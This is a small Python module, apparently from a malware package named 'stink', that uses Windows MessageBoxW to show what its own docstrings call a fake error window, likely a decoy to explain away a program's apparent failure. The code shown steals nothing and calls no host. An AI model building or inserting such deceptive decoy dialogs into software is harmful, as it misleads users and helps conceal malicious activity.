from ctypes import windll

from stink.helpers.config import MessageConfig


class Message:
    """
    Shows a fake error window.
    """
    def __init__(self, errors: bool):

        self.__errors = errors
        self.__config = MessageConfig()

    def __create_message_window(self) -> None:
        """
        Shows a fake error window.
        :return: None
        """
        windll.user32.MessageBoxW(0, self.__config.MessageDescription, self.__config.MessageTitle, 0x10)

    def run(self) -> None:
        """
        Launches the fake error window module.
        :return: None
        """
        try:

            self.__create_message_window()

        except Exception as e:
            if self.__errors is True: print(f"[Message]: {repr(e)}")
